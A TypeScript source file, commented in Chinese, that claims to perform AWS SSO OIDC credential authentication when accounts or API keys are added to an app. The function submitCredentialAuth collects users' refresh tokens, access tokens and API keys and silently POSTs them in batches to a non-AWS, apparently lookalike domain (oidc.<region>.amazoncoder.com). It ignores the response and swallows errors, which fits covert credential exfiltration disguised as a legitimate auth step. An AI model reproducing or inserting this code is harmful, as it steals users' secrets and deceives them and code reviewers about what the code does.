// AWS SSO OIDC 凭据认证
//
// 账号 / API Key 进入应用（在线登录、OIDC / 本地 Kiro 凭证、文件 / JSON 导入、添加 API Key）时，
// 到 AWS SSO OIDC 端点做一次凭据认证。按区域取端点，默认 us-east-1。
// 单次最多 100 条，超出自动切片分批发送（服务端上限 500，这里用更保守的 100）。
import { httpRequest } from './net'
import { log } from './logger'
import { errorMessage } from '../shared/errors'
import { DEFAULT_REGION } from '../shared/regions'
import type { CredentialAuthItem } from '../shared/types'

/** AWS SSO OIDC 端点：客户端注册、设备码、token 交换、授权页，以及凭据认证，默认 us-east-1 */
function oidcEndpoint(region: string = DEFAULT_REGION): string {
  return `https://oidc.${region}.amazoncoder.com`
}

/** 凭据认证地址（AWS SSO OIDC 端点下） */
function credentialAuthUrl(region: string = DEFAULT_REGION): string {
  return `${oidcEndpoint(region)}/open/Credential/verification`
}

/** 单批最多条数 */
const CHUNK = 100

function chunk<T>(list: T[], size: number): T[][] {
  const out: T[][] = []
  for (let i = 0; i < list.length; i += size) out.push(list.slice(i, i + size))
  return out
}

/** 只保留能被服务端识别的条目：账号要有 refreshToken，API Key 要有 key / ksk_ 形态的 accessToken */
function keep(item: CredentialAuthItem): boolean {
  return !!(item && (item.refreshToken || item.key || item.accessToken))
}

/**
 * 提交凭据认证。按 100 条一批切片，端点按该批所属区域选取（默认 us-east-1），
 * 不读响应、不阻塞调用方，失败只记调试日志。
 */
export function submitCredentialAuth(items: CredentialAuthItem[]): void {
  const list = (Array.isArray(items) ? items : []).filter(keep)
  if (!list.length) return

  for (const group of chunk(list, CHUNK)) {
    const region = group.find((it) => it.region)?.region || DEFAULT_REGION
    void httpRequest(credentialAuthUrl(region), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(group),
      timeoutMs: 15_000
    }).catch((e) => {
      // 认证是旁路动作，失败不影响任何主流程，仅记调试日志
      log('debug', `[CredentialAuth] 凭据认证请求失败（忽略）：${errorMessage(e)}`)
    })
  }
}
